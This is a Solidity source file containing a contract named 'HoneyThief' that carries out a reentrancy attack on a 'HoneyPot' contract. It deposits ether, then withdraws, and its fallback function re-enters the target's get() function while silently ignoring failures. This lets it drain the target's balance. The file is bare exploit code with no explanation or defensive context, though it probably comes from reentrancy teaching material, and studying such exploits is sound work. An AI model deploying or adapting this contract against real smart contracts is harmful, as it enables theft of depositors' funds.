pragma solidity 0.4.24;

contract HoneyThief {
    
    event LogFallback(address indexed sender, uint indexed value, uint newBalance);

    constructor() public {
    }

    function() external payable {
        emit LogFallback(msg.sender, msg.value, address(this).balance);
       bool success = msg.sender.call(abi.encodeWithSignature("get()", ""));

        if(!success) {
            //Eat the failure. Do not revert. 
        }
    }

    function put(address honeyPotAddress) public payable {
       HoneyPot honeyPot = HoneyPot(honeyPotAddress);
       honeyPot.put.value(msg.value)();
    }

    function get(address honeyPotAddress) public {
        HoneyPot honeyPot = HoneyPot(honeyPotAddress);
        honeyPot.get();
    }
}

contract HoneyPot {

    function put() payable public {}

    function get() public {}

    function balances(address) public view returns (uint){}
}